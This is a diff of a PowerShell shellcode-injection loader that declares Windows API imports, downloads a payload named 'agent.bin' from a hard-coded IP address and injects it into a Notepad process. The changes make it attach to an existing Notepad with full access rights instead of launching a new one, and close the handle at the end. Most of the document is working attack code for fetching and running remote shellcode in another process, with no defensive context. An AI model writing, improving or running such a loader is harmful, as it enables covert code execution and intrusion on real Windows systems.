@@ -31,6 +31,9 @@ Add-Type @"
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
     }
 
     public class MyFunctions {
@@ -50,6 +53,23 @@ Add-Type @"
 "@
 
 Write-Host "[+] Starting shellcode injection process" -ForegroundColor Green
+
+# First, ensure Notepad is running
+Write-Host "[*] Checking for running Notepad processes..." -ForegroundColor Cyan
+$notepadProcesses = Get-Process notepad -ErrorAction SilentlyContinue
+
+if ($notepadProcesses -eq $null -or $notepadProcesses.Count -eq 0) {
+    Write-Host "[!] No Notepad process found. Starting Notepad..." -ForegroundColor Yellow
+    $processInfo = Start-Process notepad -PassThru
+    Write-Host "[+] Notepad started (PID: $($processInfo.Id))" -ForegroundColor Green
+    
+    # Wait for Notepad to fully initialize
+    Write-Host "[*] Waiting for Notepad to initialize..." -ForegroundColor Cyan
+    [MyFunctions]::SleepShort(3000)
+    
+    # Refresh process list
+    $notepadProcesses = Get-Process notepad -ErrorAction SilentlyContinue
+}
 
 # Define URL to download shellcode from
 $url = "http://10.100.102.67/agent.bin"
@@ -85,11 +105,20 @@ function SleepShort($milliseconds) {
 # Ensure enough delay between operations
 SleepShort 2000
 
-# Create new notepad.exe process
-Write-Host "[*] Creating notepad process..." -ForegroundColor Cyan
-$processInfo = Start-Process notepad -PassThru
-$processHandle = $processInfo.Handle
-Write-Host "[+] Process created (PID: $($processInfo.Id), Handle: $processHandle)" -ForegroundColor Green
+# Get the last notepad.exe process
+Write-Host "[*] Finding last Notepad process..." -ForegroundColor Cyan
+$lastNotepad = $notepadProcesses | Sort-Object StartTime -Descending | Select-Object -First 1
+Write-Host "[+] Found Notepad process (PID: $($lastNotepad.Id))" -ForegroundColor Green
+
+# Open a handle to the process with necessary permissions (PROCESS_ALL_ACCESS = 0x1F0FFF)
+SleepShort 1000
+Write-Host "[*] Opening process handle..." -ForegroundColor Cyan
+$processHandle = [NtDll]::OpenProcess(0x1F0FFF, $false, $lastNotepad.Id)
+if ($processHandle -eq [IntPtr]::Zero) {
+    Write-Host "[!] Failed to open process handle" -ForegroundColor Red
+    exit
+}
+Write-Host "[+] Process handle opened successfully (Handle: $processHandle)" -ForegroundColor Green
 
 SleepShort 2000
 
@@ -154,5 +183,9 @@ if ($thandle -ne [IntPtr]::Zero) {
 SleepShort 10000
 Write-Host "[+] Shellcode injection completed successfully!" -ForegroundColor Green
 
-# Free the allocated memory - removed this as shellcode might still be using it
-# [NtDll]::NtFreeVirtualMemory($processHandle, [ref]$addr, [ref]$size, 0x8000)
+# Close the process handle
+if ($processHandle -ne [IntPtr]::Zero) {
+    Write-Host "[*] Closing process handle..." -ForegroundColor Cyan
+    [NtDll]::CloseHandle($processHandle) | Out-Null
+    Write-Host "[+] Process handle closed" -ForegroundColor Green
+}
